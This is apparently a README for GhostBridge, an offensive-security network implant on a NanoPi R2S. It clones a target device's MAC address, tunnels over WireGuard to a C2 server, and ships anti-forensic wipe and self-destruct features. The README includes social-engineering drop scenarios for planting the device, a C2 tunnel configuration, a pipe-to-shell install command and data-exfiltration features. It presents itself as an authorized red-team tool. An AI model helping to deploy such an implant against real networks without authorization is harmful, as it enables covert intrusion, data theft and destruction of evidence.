# 👻 MoMo-GhostBridge

<p align="center">
  <img src="https://img.shields.io/badge/Platform-NanoPi%20R2S-orange?style=for-the-badge" alt="Platform">
  <img src="https://img.shields.io/badge/Python-3.11+-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Status-v0.5.0%20Production%20Ready-green?style=for-the-badge" alt="Status">
  <img src="https://img.shields.io/badge/Type-Implant-red?style=for-the-badge" alt="Type">
</p>

<h3 align="center">Transparent Network Implant for Red Team Persistence</h3>

<p align="center">
  <strong>Drop it. Forget it. Own the network.</strong><br>
  Invisible Bridge • Reverse VPN • Remote Access • Long-term Persistence
</p>

---

## 🎯 What is GhostBridge?

GhostBridge is a **stealthy network implant** designed for Red Team operations. It's a small device that sits between a network port and a target device (PC, printer, etc.), creating a persistent backdoor into the corporate network.

```
                    ┌─────────────────────────────────────────────────┐
                    │              TARGET NETWORK                      │
                    │                                                  │
   [Wall Port] ─────┤─── GhostBridge ───┤─── [Target PC/Printer]      │
        │           │   (Invisible)     │                              │
        │           └───────┬───────────┴──────────────────────────────┘
        │                   │
        │                   │ WireGuard Tunnel (Encrypted)
        │                   │
        ▼                   ▼
   ┌─────────┐        ┌─────────────┐
   │ Network │        │ Your VPS /  │
   │ Traffic │        │ MoMo Server │
   │ (Normal)│        │ (C2)        │
   └─────────┘        └─────────────┘
```

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| **Transparent Bridge** | Layer 2 bridge - completely invisible to network scans |
| **MAC Cloning** | Clones target device MAC - no new device appears |
| **Reverse VPN** | WireGuard tunnel to your C2 server |
| **Auto-Reconnect** | Persistent connection with exponential backoff |
| **Stealth Mode** | No open ports, no listening services |
| **USB Powered** | Powers from printer/PC USB port |
| **Tiny Form Factor** | Smaller than a cigarette pack |
| **MoMo Integration** | Full integration with MoMo platform |

---

## 🛠️ Hardware

### Recommended: NanoPi R2S Plus

| Spec | Value |
|------|-------|
| **CPU** | Rockchip RK3328 Quad-core ARM Cortex-A53 |
| **RAM** | 1GB DDR4 |
| **Storage** | 32GB eMMC + MicroSD |
| **Network** | 2x Gigabit Ethernet (WAN + LAN) |
| **Size** | 55.6 x 52mm (smaller than credit card) |
| **Power** | 5V/2A USB-C |

### Bill of Materials

| Item | Purpose | Est. Cost |
|------|---------|-----------|
| NanoPi R2S Plus | Main board | $45 |
| MicroSD Card 32GB | OS + Logs | $10 |
| Short Ethernet Cable (15cm) | LAN connection | $3 |
| USB-A to USB-C Cable | Power from target | $5 |
| 3D Printed Case (optional) | Concealment | $10 |
| **Total** | | **~$75** |

### Alternative Hardware

| Device | Pros | Cons |
|--------|------|------|
| NanoPi R2S (non-Plus) | Cheaper ($35) | No eMMC |
| Raspberry Pi 4 | More powerful | Larger, needs USB-Ethernet |
| GL.iNet GL-AR300M | Tiny, cheap | Less powerful, no Gigabit |
| Zimaboard | x86, powerful | Larger, more power |

---

## ⚔️ Attack Scenarios

### Scenario 1: Printer Drop
```
1. Enter office as "IT support" or cleaner
2. Find network printer in corner
3. Unplug printer's network cable from wall
4. Insert GhostBridge between wall and printer
5. Power GhostBridge from printer's USB port
6. Leave - device tunnels home automatically
```

### Scenario 2: Meeting Room
```
1. Find conference room with network port
2. Install GhostBridge behind TV/projector
3. Bridge connection to display device
4. Device hides behind furniture
5. Persistent access to meeting room VLAN
```

### Scenario 3: Under-Desk Install
```
1. Social engineer access to office
2. Find target executive's desk
3. Install between wall and docking station
4. Clone docking station's MAC
5. Full access to executive's network segment
```

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        GhostBridge                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │  Bridge  │    │  Tunnel  │    │  Beacon  │    │  Stealth │  │
│  │  Engine  │───▶│  Manager │───▶│  System  │───▶│  Module  │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│       │               │               │               │         │
│       ▼               ▼               ▼               ▼         │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │ eth0/eth1│    │ WireGuard│    │ Heartbeat│    │ Anti-    │  │
│  │ Bridging │    │ wg0      │    │ to C2    │    │ Forensic │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Core Components

| Component | Responsibility |
|-----------|---------------|
| **Bridge Engine** | Transparent L2 bridging, MAC cloning |
| **Tunnel Manager** | WireGuard connection, auto-reconnect |
| **Beacon System** | Heartbeat, health checks, commands |
| **Stealth Module** | Anti-forensics, log cleanup, kill switch |
| **MoMo Link** | Integration with MoMo C2 platform |

---

## 🔌 MoMo Integration

GhostBridge integrates seamlessly with MoMo platform:

```
┌─────────────────┐         ┌─────────────────┐
│   GhostBridge   │◄───────►│   MoMo Server   │
│   (Field)       │  VPN    │   (C2)          │
├─────────────────┤         ├─────────────────┤
│ • Status beacon │         │ • Device mgmt   │
│ • Network intel │         │ • Command queue │
│ • Captured data │         │ • Data exfil    │
│ • Live shell    │         │ • Web dashboard │
└─────────────────┘         └─────────────────┘
```

### Integration Features

- **Fleet Management** - Manage multiple GhostBridge devices
- **Real-time Status** - See all implants on MoMo dashboard
- **Command Queue** - Send commands to field devices
- **Data Sync** - Automatic upload of captured intel
- **Pivot Point** - Use as network pivot for attacks

---

## 📡 Communication

### Primary: WireGuard VPN

```ini
[Interface]
PrivateKey = <generated>
Address = 10.66.66.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = <C2_server_pubkey>
Endpoint = your-c2.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

### Fallback Options

| Method | When Used |
|--------|-----------|
| WireGuard (UDP 51820) | Primary - fastest |
| WireGuard over TCP 443 | If UDP blocked |
| Cloudflare Tunnel | If VPN blocked |
| DNS Tunneling (iodine) | Last resort |

---

## 🛡️ Stealth Features

### Network Stealth
- ✅ Layer 2 transparent bridge (no IP on bridge)
- ✅ MAC address cloning from target device
- ✅ No ARP announcements
- ✅ No listening ports (outbound only)
- ✅ Traffic timing randomization

### Host Stealth
- ✅ Encrypted filesystem (dm-crypt)
- ✅ RAM-only operation mode
- ✅ Auto log cleanup
- ✅ Kill switch on tamper detect
- ✅ Secure boot with signed images

### Anti-Forensics
- ✅ No persistent logs (tmpfs)
- ✅ Secure erase on panic
- ✅ Fake "router" identity if probed
- ✅ Self-destruct command from C2

---

## 🚀 Installation & Development

### Quick Start (Development)
```bash
# Clone repository
git clone https://github.com/your-org/ghostbridge.git
cd ghostbridge

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # Linux/Mac
# .venv\Scripts\activate   # Windows

# Install dependencies
pip install -e ".[dev]"

# Run tests
pytest tests/ -v

# Generate config
ghostbridge config generate -o config.yml

# Run self-tests
ghostbridge test

# Run health check
ghostbridge health
```

### Deployment (NanoPi R2S)
```bash
# Method 1: Quick Install Script
curl -sSL https://raw.githubusercontent.com/.../install.sh | sudo bash

# Method 2: Quick Deploy (with C2 config)
sudo ./scripts/deploy.sh "vpn.example.com:51820" "SERVER_PUBKEY"

# Method 3: Manual Install
ssh root@<device-ip>
cd /opt/ghostbridge
sudo bash scripts/install.sh

# Start full system
ghostbridge run
```

### CLI Commands
```bash
ghostbridge run                    # Run full system
ghostbridge start                  # Start bridge only
ghostbridge status                 # Show system status
ghostbridge health                 # Health check

ghostbridge tunnel connect         # Connect VPN tunnel
ghostbridge tunnel status          # Tunnel status

ghostbridge stealth wipe           # Wipe logs
ghostbridge stealth check          # Check for threats
ghostbridge stealth panic          # Emergency wipe (DANGER!)

ghostbridge config generate        # Generate config file
ghostbridge config validate        # Validate config
ghostbridge test                   # Run self-tests
```

### Configuration Options
```yaml
# /etc/ghostbridge/config.yml
network:
  bridge_name: br0
  wan_interface: eth0      # To wall
  lan_interface: eth1      # To target
  clone_mac: true          # Clone target MAC on WAN
  
tunnel:
  type: wireguard
  endpoint: your-c2.com:51820
  private_key: /etc/wireguard/private.key
  keepalive: 25
  reconnect_delay: [5, 10, 30, 60, 300]  # Exponential backoff
  
beacon:
  interval: 300            # 5 minutes
  jitter: 60               # ±1 minute randomization
  
stealth:
  ramfs_logs: true
  fake_identity: "Netgear Switch"
  panic_wipe: true
  
momo:
  enabled: true
  api_endpoint: "https://momo.your-server.com/api"
  device_id: "ghost-001"
```

---

## 📂 Project Structure

```
ghostbridge/
├── src/ghostbridge/           # Main package
│   ├── main.py               # Main orchestrator
│   ├── cli.py                # Command line interface
│   ├── core/                  # Core modules
│   │   ├── config.py         # Configuration (Pydantic)
│   │   ├── bridge.py         # L2 Bridge manager
│   │   ├── tunnel.py         # Tunnel manager
│   │   └── stealth.py        # Anti-forensics
│   ├── c2/                    # C2 Integration
│   │   ├── client.py         # MoMo API client
│   │   ├── beacon.py         # Heartbeat service
│   │   └── commands.py       # Command handlers
│   └── infrastructure/        # System integration
│       ├── network/          # Network operations
│       ├── wireguard/        # WireGuard tunnel
│       └── system/           # RAM disk, secure wipe
├── scripts/                   # Shell scripts
│   ├── install.sh            # Installation script
│   ├── deploy.sh             # Quick deploy
│   ├── build-image.sh        # SD card image builder
│   ├── panic.sh              # Emergency wipe
│   ├── setup-bridge.sh       # Bridge setup
│   └── teardown-bridge.sh    # Bridge teardown
├── services/                  # Systemd services
│   ├── ghostbridge.service
│   ├── ghostbridge-tunnel.service
│   ├── ghostbridge-beacon.service
│   └── ghostbridge-stealth.timer
├── tests/                     # Test suite
├── config/                    # Example configs
└── docs/                      # Documentation
```

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical architecture |
| [DEPLOYMENT.md](docs/DEPLOYMENT.md) | Deployment guide |
| [OPERATIONS.md](docs/OPERATIONS.md) | Operational security |
| [ROADMAP.md](docs/ROADMAP.md) | Development roadmap |

---

## ⚠️ Legal Disclaimer

**GhostBridge is designed for authorized Red Team operations and security research only.**

- Only deploy on networks you own or have explicit written authorization to test
- Unauthorized deployment is illegal in most jurisdictions
- The developers are not responsible for misuse of this tool
- Always obtain proper authorization before any engagement

---

## 📜 License

This project is part of the MoMo platform and is licensed under the **MIT License**.

---

<p align="center">
  <strong>Part of the 🔥 MoMo Platform</strong><br>
  <sub>Offensive Security Toolkit for Red Teams</sub>
</p>

